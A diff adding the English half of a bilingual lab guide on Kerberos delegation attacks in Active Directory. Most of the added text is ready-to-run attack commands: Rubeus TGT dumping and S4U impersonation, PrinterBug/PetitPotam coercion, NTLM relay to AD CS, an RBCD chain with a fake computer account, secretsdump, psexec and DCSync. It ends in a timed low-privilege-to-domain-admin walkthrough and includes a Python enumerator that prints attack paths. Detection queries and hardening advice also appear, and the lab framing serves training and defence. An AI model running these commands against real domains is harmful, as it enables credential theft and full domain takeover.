@@ -1,3 +1,9 @@
+> 🌐 **Language / 언어**: [🇰🇷 한국어](#한국어) | [🇺🇸 English](#english)
+
+---
+
+<a name="한국어"></a>
+
 # Kerberos 위임 공격 완전 가이드
 > AI_Innovation_Studio | Active Directory Delegation Attacks Lab
 
@@ -744,5 +750,758 @@ secretsdump.py -k -no-pass WORKSTATION01.corp.local
 단계 5: 도메인 장악
 ─────────────────────────────────────────────────────────
 # DA 크리덴셜로 DCSync
+secretsdump.py corp.local/Administrator:'DAPassword'@DC01.corp.local
+```
+
+---
+
+<a name="english"></a>
+
+# Kerberos Delegation Attacks — Complete Guide
+> AI_Innovation_Studio | Active Directory Delegation Attacks Lab
+
+---
+
+## 1. Kerberos Delegation Overview
+
+### Kerberos Authentication Flow Review
+
+```
+Client                     KDC (Key Distribution Center)       Service
+    │                              │                              │
+    │─── AS-REQ (username+password)→│                              │
+    │←── AS-REP (TGT issued) ───────│                              │
+    │                              │                              │
+    │─── TGS-REQ (TGT + SPN) ─────→│                              │
+    │←── TGS-REP (Service Ticket) ──│                              │
+    │                                                             │
+    │──────────────── AP-REQ (Service Ticket) ──────────────────→│
+    │←──────────────── AP-REP (Authentication complete) ─────────│
+```
+
+### What is Delegation?
+
+Delegation is the mechanism that allows a web server (Service A) to access a database (Service B) on behalf of a user. The service reuses the user's Kerberos credentials to authenticate to another service.
+
+### Delegation Type Comparison
+
+| Type | AD Attribute | Restriction | Attack Risk |
+|------|-------------|-------------|-------------|
+| **Unconstrained Delegation** | `TrustedForDelegation=True` | None (any service allowed) | ★★★★★ Very High |
+| **Constrained Delegation** | `TrustedToAuthForDelegation=True` | Specific SPNs only | ★★★★☆ High |
+| **Resource-Based Constrained Delegation (RBCD)** | `msDS-AllowedToActOnBehalfOfOtherIdentity` | Resource specifies allowed list | ★★★★☆ High |
+
+---
+
+## 2. Enumerating Delegation Settings
+
+### Enumeration with PowerView
+
+```powershell
+# Run Import-Module PowerView.ps1 first
+
+# List computers with unconstrained delegation
+Get-ADComputer -Filter {TrustedForDelegation -eq $true} `
+    -Properties TrustedForDelegation, ServicePrincipalName, Description |
+    Select-Object Name, DNSHostName, ServicePrincipalName
+
+# Service accounts with constrained delegation
+Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne "$null"} `
+    -Properties SAMAccountName, msDS-AllowedToDelegateTo, userAccountControl |
+    Select-Object SAMAccountName, msDS-AllowedToDelegateTo
+
+# Using PowerView
+Get-DomainComputer -Unconstrained | Select-Object Name, DnsHostName
+Get-DomainUser -TrustedToAuth | Select-Object SAMAccountName, msDS-AllowedToDelegateTo
+Get-DomainComputer -TrustedToAuth | Select-Object Name, msDS-AllowedToDelegateTo
+```
+
+This enumerates computers and service accounts with delegation configured in the AD environment. Computers with TrustedForDelegation=True are the primary targets for unconstrained delegation attacks.
+
+### Enumeration with ldapsearch (Linux)
+
+```bash
+# Computers with unconstrained delegation (userAccountControl flag 0x80000 = TRUSTED_FOR_DELEGATION)
+ldapsearch -x -H ldap://192.168.1.10 \
+    -D "CORP\lowpriv" -w "Password123" \
+    -b "dc=corp,dc=local" \
+    "(userAccountControl:1.2.840.113556.1.4.803:=524288)" \
+    sAMAccountName userAccountControl
+
+# Accounts with constrained delegation
+ldapsearch -x -H ldap://192.168.1.10 \
+    -D "CORP\lowpriv" -w "Password123" \
+    -b "dc=corp,dc=local" \
+    "(msDS-AllowedToDelegateTo=*)" \
+    sAMAccountName "msDS-AllowedToDelegateTo"
+```
+
+### BloodHound Cypher Queries
+
+```cypher
+// Computers with unconstrained delegation (excluding DCs)
+MATCH (c:Computer {unconstraineddelegation: true})
+WHERE NOT c.name CONTAINS "DC"
+RETURN c.name, c.operatingsystem
+
+// Accounts with constrained delegation configured
+MATCH (u)-[:AllowedToDelegate]->(c:Computer)
+RETURN u.name, c.name
+
+// RBCD path: write permission → can configure RBCD
+MATCH p=shortestPath((u:User)-[*1..5]->(c:Computer))
+WHERE ANY(r IN relationships(p) WHERE type(r) IN ["GenericAll","GenericWrite","WriteProperty"])
+AND NOT u.name = "Administrator"
+RETURN p
+```
+
+---
+
+## 3. Unconstrained Delegation Attack
+
+### How It Works
+
+```
+Attacker                Unconstrained Delegation Server    KDC              DC
+    │                           │                           │               │
+    │                           │←── User connects ─────────│               │
+    │                           │    TGT stored in memory                   │
+    │                           │                           │               │
+    │── Compromise server ──────→│                           │               │
+    │←── Rubeus dump ───────────│   TGT can be extracted    │               │
+    │                           │                           │               │
+    │── DCSync with TGT ──────────────────────────────────────────────────→│
+    │←── All hashes dumped ───────────────────────────────────────────────│
+```
+
+The TGT of every user who connects to an unconstrained delegation server is stored in that server's memory. Compromising the server allows extraction of those TGTs and full impersonation of those users.
+
+### Attack Execution: Extracting TGTs with Rubeus
+
+```powershell
+# (After compromising the unconstrained delegation server) dump all TGTs in memory
+Rubeus.exe dump /nowrap
+
+# Real-time monitoring (capture new TGTs every 5 seconds)
+Rubeus.exe monitor /interval:5 /nowrap /filteruser:Administrator
+
+# Save extracted Base64 TGT to file and use it
+Rubeus.exe ptt /ticket:<base64_TGT>
+
+# Perform DCSync with the TGT (Mimikatz)
+mimikatz# lsadump::dcsync /user:krbtgt /domain:corp.local
+```
+
+Rubeus monitor automatically captures every new TGT that is loaded into memory. If DC01's TGT is captured, the entire domain can be compromised.
+
+### Forcing Authentication with SpoolSample / PrinterBug
+
+Force DC01 to authenticate to the unconstrained delegation server, then capture DC01's TGT.
+
+```bash
+# Linux (printerbug.py — impacket-based)
+python3 printerbug.py corp.local/lowpriv:Password123@DC01.corp.local \
+    UNCONSTRAINED_SERVER.corp.local
+
+# Windows (SpoolSample.exe)
+SpoolSample.exe DC01.corp.local UNCONSTRAINED_SERVER.corp.local
+
+# Simultaneously run Rubeus monitor on the unconstrained delegation server
+Rubeus.exe monitor /interval:3 /filteruser:DC01$ /nowrap
+```
+
+PrinterBug abuses the RPC functionality of the Windows Spooler service to force DC01 to perform NTLM authentication against the attacker's server.
+
+### Forcing Authentication with PetitPotam (EFSRPC)
+
+```bash
+# Alternative when PrinterBug has been patched
+python3 PetitPotam.py -u lowpriv -p Password123 \
+    UNCONSTRAINED_SERVER.corp.local DC01.corp.local
+
+# Can be combined with NTLM Relay to steal DC certificates (AD CS environments)
+python3 ntlmrelayx.py -t http://CA.corp.local/certsrv/certfnsh.asp \
+    --adcs --template DomainController
+```
+
+### Detection
+
+```
+Event ID 4769: Kerberos Service Ticket Request
+  → Anomaly: TGS request for DC machine account (DC01$) originating from an internal server
+  → Check for the forwardable (0x40000000) flag in Ticket Options
+
+Event ID 4624 Type 3: Network Logon
+  → Repeated DC authentication to the unconstrained delegation server
+```
+
+---
+
+## 4. Constrained Delegation Attack
+
+### How It Works: S4U Extension
+
+```
+S4U2Self:  Service requests a service ticket for itself on behalf of any user
+S4U2Proxy: Uses the ticket from S4U2Self to perform a delegated request to an allowed service
+
+Attack prerequisites:
+  - Hash or TGT of an account with TrustedToAuthForDelegation=True
+  - List of allowed SPNs in msDS-AllowedToDelegateTo
+
+Attack outcome:
+  - Can authenticate as any user (including Administrator) to the allowed services
+```
+
+### Enumeration and Target Identification
+
+```powershell
+# Detailed information on constrained delegation service accounts
+Get-ADUser -Filter {msDS-AllowedToDelegateTo -ne "$null"} `
+    -Properties msDS-AllowedToDelegateTo, userAccountControl |
+    ForEach-Object {
+        Write-Host "Account: $($_.SamAccountName)"
+        Write-Host "Allowed SPNs: $($_.msDS-AllowedToDelegateTo)"
+        Write-Host "Protocol Transition: $(($_.userAccountControl -band 0x1000000) -ne 0)"
+        Write-Host "---"
+    }
+```
+
+### Attack Execution: Rubeus S4U
+
+```powershell
+# Method 1: Using the service account's password hash (obtained via Kerberoasting, etc.)
+Rubeus.exe s4u /user:svc_iis `
+    /rc4:NTLM_HASH_HERE `
+    /impersonateuser:Administrator `
+    /msdsspn:"cifs/fileserver.corp.local" `
+    /nowrap
+
+# Method 2: S4U + alterservice (convert ticket to a different SPN)
+# Allowed SPN: http/webserver → convert to cifs/webserver
+Rubeus.exe s4u /user:svc_iis `
+    /rc4:NTLM_HASH `
+    /impersonateuser:Administrator `
+    /msdsspn:"http/webserver.corp.local" `
+    /altservice:"cifs/webserver.corp.local,host/webserver.corp.local" `
+    /nowrap
+
+# Inject the obtained TGS into memory
+Rubeus.exe ptt /ticket:<base64_TGS>
+
+# Verify access
+dir \\fileserver.corp.local\C$
+```
+
+Rubeus s4u issues an Administrator-privileged service ticket using only the service account's hash. The alterservice option converts the allowed SPN to target a different service.
+
+### Same Attack with impacket (Linux)
+
+```bash
+# Obtain a service ticket with getST.py
+getST.py -spn 'cifs/fileserver.corp.local' \
+    -impersonate 'Administrator' \
+    -dc-ip 192.168.1.10 \
+    'corp.local/svc_iis:ServicePassword'
+
+# Use the obtained ccache file
+export KRB5CCNAME=Administrator.ccache
+smbclient.py -k -no-pass fileserver.corp.local
+
+# DCSync (if a Domain Admin TGS was obtained)
+secretsdump.py -k -no-pass corp.local
+```
+
+---
+
+## 5. Resource-Based Constrained Delegation (RBCD) Attack
+
+### How It Works
+
+```
+Traditional constrained delegation: The KDC grants delegation rights to the service
+RBCD:                               The resource (target) itself specifies its own allowed list
+
+Prerequisites:
+  - GenericAll/GenericWrite/WriteProperty permission on the target computer object
+  - OR the default ms-DS-MachineAccountQuota value (default: 10) held by Domain Users
+    → Regular users can create up to 10 new computer accounts in the domain
+
+Attack flow:
+  1. Create a fake computer account (FAKEMACHINE$)
+  2. Add FAKEMACHINE$ to the target computer's msDS-AllowedToActOnBehalfOfOtherIdentity
+  3. Obtain an Administrator TGS via S4U2Self + S4U2Proxy
+  4. Access the target computer as Administrator
+```
+
+### Full Attack Chain (Linux — impacket)
+
+```bash
+# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+# Step 1: Check MachineAccountQuota
+# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+ldapsearch -x -H ldap://192.168.1.10 \
+    -D "CORP\lowpriv" -w "Password123" \
+    -b "dc=corp,dc=local" \
+    "(objectClass=domain)" \
+    ms-DS-MachineAccountQuota
+
+# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+# Step 2: Create a fake computer account
+# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+addcomputer.py \
+    -computer-name 'FAKEMACHINE$' \
+    -computer-pass 'FakePass123!' \
+    -dc-ip 192.168.1.10 \
+    'corp.local/lowpriv:Password123'
+
+# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+# Step 3: Set the RBCD attribute on the target computer
+# (lowpriv account must have write permission on the TARGET$ object)
+# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+rbcd.py \
+    -delegate-from 'FAKEMACHINE$' \
+    -delegate-to 'TARGET$' \
+    -action write \
+    -dc-ip 192.168.1.10 \
+    'corp.local/lowpriv:Password123'
+
+# Verify the setting
+rbcd.py \
+    -delegate-to 'TARGET$' \
+    -action read \
+    -dc-ip 192.168.1.10 \
+    'corp.local/lowpriv:Password123'
+
+# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+# Step 4: Obtain an Administrator TGS via S4U2Self + S4U2Proxy
+# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+getST.py \
+    -spn 'cifs/TARGET.corp.local' \
+    -impersonate 'Administrator' \
+    -dc-ip 192.168.1.10 \
+    'corp.local/FAKEMACHINE$:FakePass123!'
+
+# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+# Step 5: Access the target with the obtained TGS
+# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+export KRB5CCNAME=Administrator@cifs_TARGET.corp.local@CORP.LOCAL.ccache
+
+# Access via SMB
+smbclient.py -k -no-pass TARGET.corp.local
+
+# Dump hashes (with local admin privileges)
+secretsdump.py -k -no-pass TARGET.corp.local
+
+# Remote command execution
+psexec.py -k -no-pass Administrator@TARGET.corp.local
+```
+
+This is the full attack chain: create a fake computer account, set the RBCD attribute, then issue an Administrator service ticket via S4U2Proxy.
+
+### RBCD Attack (Windows — Rubeus + PowerView)
+
+```powershell
+# Step 1: Create a fake computer account
+New-MachineAccount -MachineAccount FAKEMACHINE -Password $(ConvertTo-SecureString 'FakePass123!' -AsPlainText -Force)
+
+# Step 2: Get the SID of the fake computer
+$SID = Get-DomainComputer FAKEMACHINE -Properties objectsid | Select -Expand objectsid
+
+# Step 3: Set the RBCD attribute (using PowerView's Set-DomainObject)
+$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($SID))"
+$SDBytes = New-Object byte[] ($SD.BinaryLength)
+$SD.GetBinaryForm($SDBytes, 0)
+Get-DomainComputer TARGET | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}
+
+# Step 4: Obtain and inject TGS via S4U
+Rubeus.exe s4u /user:FAKEMACHINE$ /rc4:<NTLM_hash_of_FakePass123!> `
+    /impersonateuser:Administrator /msdsspn:cifs/TARGET.corp.local /ptt
+
+# Verify access
+dir \\TARGET.corp.local\C$
+```
+
+### GenericWrite → RBCD Path (Common Scenario)
+
+```
+Path discoverable in BloodHound:
+  lowpriv (User) → [GenericWrite] → WORKSTATION01 (Computer)
+  
+  Because GenericWrite permission exists on WORKSTATION01,
+  the msDS-AllowedToActOnBehalfOfOtherIdentity attribute can be modified
+  → RBCD attack to gain local admin on WORKSTATION01
+  → Credential harvesting → Move to higher privileges
+```
+
+---
+
+## 6. Kerberos Delegation Automation Python Tool
+
+```python
+#!/usr/bin/env python3
+"""
+Automated Kerberos delegation vulnerability enumeration and attack path analysis tool
+Uses the ldap3 library to enumerate delegation settings in AD
+and automatically suggests exploitable attack paths.
+"""
+
+from __future__ import annotations
+import argparse
+import json
+import sys
+from dataclasses import dataclass, field, asdict
+from typing import Any
+
+try:
+    import ldap3
+    from ldap3 import Server, Connection, ALL, NTLM, SUBTREE
+except ImportError:
+    print("[!] ldap3 not installed: pip install ldap3", file=sys.stderr)
+    sys.exit(1)
+
+
+UAC_TRUSTED_FOR_DELEGATION = 0x80000          # Unconstrained delegation
+UAC_TRUSTED_TO_AUTH_FOR_DELEGATION = 0x1000000  # Constrained delegation (Protocol Transition)
+
+
+@dataclass
+class DelegationFinding:
+    account_name: str
+    account_type: str  # "computer" or "user"
+    delegation_type: str  # "unconstrained", "constrained", "rbcd"
+    allowed_spns: list[str] = field(default_factory=list)
+    risk: str = "high"
+    attack_path: str = ""
+
+
+def parse_args() -> argparse.Namespace:
+    parser = argparse.ArgumentParser(
+        description="Automated Kerberos delegation vulnerability enumeration tool",
+        formatter_class=argparse.RawDescriptionHelpFormatter,
+        epilog="""
+Examples:
+  %(prog)s enum -d corp.local -u lowpriv -p Password123 --dc-ip 192.168.1.10
+  %(prog)s enum -d corp.local -u lowpriv -p Password123 --dc-ip 192.168.1.10 -o findings.json
+        """,
+    )
+    subparsers = parser.add_subparsers(dest="command", required=True)
+
+    enum_parser = subparsers.add_parser("enum", help="Enumerate delegation settings")
+    enum_parser.add_argument("-d", "--domain", required=True, help="Domain name (e.g. corp.local)")
+    enum_parser.add_argument("-u", "--username", required=True, help="Username")
+    enum_parser.add_argument("-p", "--password", required=True, help="Password")
+    enum_parser.add_argument("--dc-ip", required=True, help="DC IP address")
+    enum_parser.add_argument(
+        "-o", "--output", help="Output JSON file path"
+    )
+    enum_parser.add_argument(
+        "--no-dc", action="store_true",
+        help="Exclude Domain Controller accounts from results"
+    )
+
+    return parser.parse_args()
+
+
+def connect_ldap(domain: str, username: str, password: str, dc_ip: str) -> Connection:
+    """Connect to the LDAP server."""
+    server = Server(dc_ip, get_info=ALL)
+    conn = Connection(
+        server,
+        user=f"{domain}\\{username}",
+        password=password,
+        authentication=NTLM,
+        auto_bind=True,
+    )
+    return conn
+
+
+def get_base_dn(domain: str) -> str:
+    """Convert a domain name to DN format."""
+    return ",".join(f"dc={part}" for part in domain.split("."))
+
+
+def enumerate_unconstrained(conn: Connection, base_dn: str, exclude_dc: bool) -> list[DelegationFinding]:
+    """Enumerate accounts with unconstrained delegation."""
+    findings = []
+
+    # UAC flag 524288 = 0x80000 = TRUSTED_FOR_DELEGATION
+    conn.search(
+        search_base=base_dn,
+        search_filter="(userAccountControl:1.2.840.113556.1.4.803:=524288)",
+        search_scope=SUBTREE,
+        attributes=["sAMAccountName", "objectClass", "userAccountControl", "dNSHostName"],
+    )
+
+    for entry in conn.entries:
+        name = str(entry.sAMAccountName)
+        obj_class = [c.lower() for c in entry.objectClass]
+        account_type = "computer" if "computer" in obj_class else "user"
+
+        if exclude_dc and name.endswith("$") and "domaincontroller" in [c.lower() for c in obj_class]:
+            continue
+
+        findings.append(DelegationFinding(
+            account_name=name,
+            account_type=account_type,
+            delegation_type="unconstrained",
+            risk="critical",
+            attack_path=(
+                f"1. Compromise the {name} server\n"
+                f"2. Collect TGTs with Rubeus monitor\n"
+                f"3. Force DC TGT collection via SpoolSample/PetitPotam\n"
+                f"4. DCSync → Full domain takeover"
+            ),
+        ))
+
+    return findings
+
+
+def enumerate_constrained(conn: Connection, base_dn: str) -> list[DelegationFinding]:
+    """Enumerate accounts with constrained delegation."""
+    findings = []
+
+    conn.search(
+        search_base=base_dn,
+        search_filter="(msDS-AllowedToDelegateTo=*)",
+        search_scope=SUBTREE,
+        attributes=["sAMAccountName", "objectClass", "msDS-AllowedToDelegateTo", "userAccountControl"],
+    )
+
+    for entry in conn.entries:
+        name = str(entry.sAMAccountName)
+        obj_class = [c.lower() for c in entry.objectClass]
+        account_type = "computer" if "computer" in obj_class else "user"
+        allowed_spns = [str(s) for s in entry["msDS-AllowedToDelegateTo"]]
+
+        uac = int(entry.userAccountControl) if entry.userAccountControl else 0
+        protocol_transition = bool(uac & UAC_TRUSTED_TO_AUTH_FOR_DELEGATION)
+
+        findings.append(DelegationFinding(
+            account_name=name,
+            account_type=account_type,
+            delegation_type="constrained",
+            allowed_spns=allowed_spns,
+            risk="high",
+            attack_path=(
+                f"1. Obtain credentials for {name} (via Kerberoasting, etc.)\n"
+                f"2. Rubeus s4u /user:{name} /rc4:<hash> "
+                f"/impersonateuser:Administrator /msdsspn:{allowed_spns[0] if allowed_spns else 'SPN'}\n"
+                f"3. Access the service with the obtained TGS\n"
+                f"{'[!] Protocol Transition enabled — can impersonate any user' if protocol_transition else ''}"
+            ),
+        ))
+
+    return findings
+
+
+def print_findings(findings: list[DelegationFinding]) -> None:
+    """Print discovered delegation vulnerabilities."""
+    if not findings:
+        print("[+] No delegation vulnerabilities found")
+        return
+
+    print(f"\n{'='*60}")
+    print(f"  {len(findings)} delegation vulnerabilities found")
+    print(f"{'='*60}\n")
+
+    for i, f in enumerate(findings, 1):
+        risk_color = "★★★★★" if f.risk == "critical" else "★★★★☆"
+        print(f"[{i}] {f.account_name} ({f.account_type})")
+        print(f"    Delegation type: {f.delegation_type.upper()}")
+        print(f"    Risk:            {risk_color}")
+        if f.allowed_spns:
+            print(f"    Allowed SPNs: {', '.join(f.allowed_spns[:3])}")
+        print(f"    Attack path:")
+        for line in f.attack_path.split("\n"):
+            if line.strip():
+                print(f"      {line}")
+        print()
+
+
+def main() -> None:
+    args = parse_args()
+
+    if args.command == "enum":
+        print(f"[*] LDAP connection: {args.dc_ip} ({args.domain})")
+        try:
+            conn = connect_ldap(args.domain, args.username, args.password, args.dc_ip)
+        except Exception as e:
+            print(f"[!] Connection failed: {e}", file=sys.stderr)
+            sys.exit(1)
+
+        base_dn = get_base_dn(args.domain)
+        print(f"[*] Search base: {base_dn}\n")
+
+        all_findings: list[DelegationFinding] = []
+
+        print("[*] Enumerating unconstrained delegation...")
+        all_findings.extend(enumerate_unconstrained(conn, base_dn, args.no_dc))
+
+        print("[*] Enumerating constrained delegation...")
+        all_findings.extend(enumerate_constrained(conn, base_dn))
+
+        print_findings(all_findings)
+
+        if args.output:
+            import pathlib
+            output_data = [asdict(f) for f in all_findings]
+            pathlib.Path(args.output).write_text(
+                json.dumps(output_data, indent=2, ensure_ascii=False)
+            )
+            print(f"[*] Results saved: {args.output}")
+
+
+if __name__ == "__main__":
+    main()
+```
+
+This tool queries the AD environment via LDAP to automatically enumerate unconstrained and constrained delegation settings, and suggests concrete attack paths for each vulnerability.
+
+---
+
+## 7. Detection and Defense
+
+### Event ID-Based Detection
+
+| Event ID | Log | Description | Delegation Attack Relevance |
+|---------|-----|-------------|----------------------------|
+| **4769** | Security | Kerberos Service Ticket Request | Detect S4U requests |
+| **4771** | Security | Kerberos Pre-authentication failed | Failed AS-REQ |
+| **4624** Type 3 | Security | Network Logon | Access to unconstrained delegation server |
+| **5145** | Security | Network Share Access | CIFS/SMB access |
+| **4738** | Security | User Account Changed | RBCD attribute modification |
+| **4742** | Security | Computer Account Changed | RBCD attribute modification |
+
+### Splunk Detection Queries
+
+```spl
+-- Detect S4U2Self requests (forwardable flag in Ticket Options)
+index=windows EventCode=4769
+| eval ticket_opts=mvindex(split(Ticket_Options, "0x"),1)
+| where tonumber(ticket_opts, 16) band 0x40000000 > 0
+| where NOT Service_Name IN ("krbtgt", "$")
+| stats count, values(Account_Name) by Service_Name, Client_Address
+| where count > 5
+
+-- Detect anomalous connections to unconstrained delegation servers
+index=windows EventCode=4624 Logon_Type=3
+| lookup unconstrained_delegation_servers ComputerName AS host
+| where isnotnull(delegation_type)
+| stats count by src_ip, host, Account_Name
+| where count > 10
+
+-- Detect RBCD attribute modification
+index=windows EventCode=4742
+| eval msg=coalesce(Message, "")
+| where match(msg, "msDS-AllowedToActOnBehalfOfOtherIdentity")
+| table _time, host, Subject_Account_Name, Target_Account_Name
+```
+
+### Microsoft Sentinel KQL Detection
+
+```kusto
+// Detect anomalous S4U Kerberos delegation requests
+SecurityEvent
+| where EventID == 4769
+| extend TicketOptions = tostring(EventData["TicketOptions"])
+// Forwardable flag = 0x40000000
+| where TicketOptions has "0x40000000"
+| where ServiceName !endswith "$" and ServiceName != "krbtgt"
+| summarize RequestCount = count(), Accounts = make_set(AccountName)
+    by ServiceName, ClientAddress, bin(TimeGenerated, 1h)
+| where RequestCount > 20
+| extend AlertSeverity = "High"
+
+// Detect RBCD attribute modification
+SecurityEvent
+| where EventID in (4738, 4742)
+| where EventData has "msDS-AllowedToActOnBehalfOfOtherIdentity"
+| project TimeGenerated, SubjectUserName, TargetUserName = AccountName,
+          Computer
+| extend AlertSeverity = "Critical"
+```
+
+### Defensive Countermeasures
+
+```
+1. Completely eliminate unconstrained delegation
+   → After migrating legacy services, set TrustedForDelegation=False
+
+2. Use the Protected Users group (Windows Server 2012 R2+)
+   → Group members cannot be used for Kerberos delegation
+   → Add administrator and service accounts to this group
+
+3. Mark accounts as sensitive
+   → Check "Account is sensitive and cannot be delegated"
+   → Required for privileged accounts such as DA and EA
+
+4. Tiered Administration Model
+   Tier 0: DC, PKI, authentication services (isolated)
+   Tier 1: Server administration
+   Tier 2: Workstation administration
+
+5. Set ms-DS-MachineAccountQuota to 0
+   → Block regular users from creating computer accounts
+   → Removes the key prerequisite for RBCD attacks
+
+6. Migrate from constrained delegation to RBCD
+   → Finer-grained control than constrained delegation
+   → Resource owners manage their own allowed list directly
+```
+
+---
+
+## 8. Comprehensive Attack Scenario: Low Privilege → Domain Admin
+
+```
+Scenario: lowpriv account (regular domain user) → DA acquisition
+Estimated time: ~15 minutes (assuming environment is prepared)
+
+─────────────────────────────────────────────────────────
+Step 1: Reconnaissance [5 minutes]
+─────────────────────────────────────────────────────────
+1a. Collect domain data with BloodHound
+    bloodhound-python -u lowpriv -p Password123 \
+        -d corp.local -dc 192.168.1.10 -c all --zip
+
+1b. Analyze in BloodHound GUI
+    → Check "Shortest Paths to Domain Admins"
+    → Discover RBCD path: lowpriv → [GenericWrite] → WORKSTATION01
+
+─────────────────────────────────────────────────────────
+Step 2: Check MachineAccountQuota [1 minute]
+─────────────────────────────────────────────────────────
+crackmapexec ldap 192.168.1.10 -u lowpriv -p Password123 \
+    --kdcHost 192.168.1.10 -M maq
+
+─────────────────────────────────────────────────────────
+Step 3: Execute RBCD attack [5 minutes]
+─────────────────────────────────────────────────────────
+# Create fake computer account
+addcomputer.py -computer-name 'PWNED$' -computer-pass 'Pwned123!' \
+    -dc-ip 192.168.1.10 'corp.local/lowpriv:Password123'
+
+# Set RBCD attribute
+rbcd.py -delegate-from 'PWNED$' -delegate-to 'WORKSTATION01$' \
+    -action write -dc-ip 192.168.1.10 'corp.local/lowpriv:Password123'
+
+# Issue Administrator TGS
+getST.py -spn 'cifs/WORKSTATION01.corp.local' -impersonate 'Administrator' \
+    -dc-ip 192.168.1.10 'corp.local/PWNED$:Pwned123!'
+
+─────────────────────────────────────────────────────────
+Step 4: Credential harvesting [2 minutes]
+─────────────────────────────────────────────────────────
+export KRB5CCNAME=Administrator@cifs_WORKSTATION01.corp.local@CORP.LOCAL.ccache
+secretsdump.py -k -no-pass WORKSTATION01.corp.local
+
+# If the harvested hashes include a reused DA password → DA acquired
+# Or if a Kerberoastable service account is a workstation local admin → pivot
+
+─────────────────────────────────────────────────────────
+Step 5: Domain takeover
+─────────────────────────────────────────────────────────
+# DCSync with DA credentials
 secretsdump.py corp.local/Administrator:'DAPassword'@DC01.corp.local
 ```
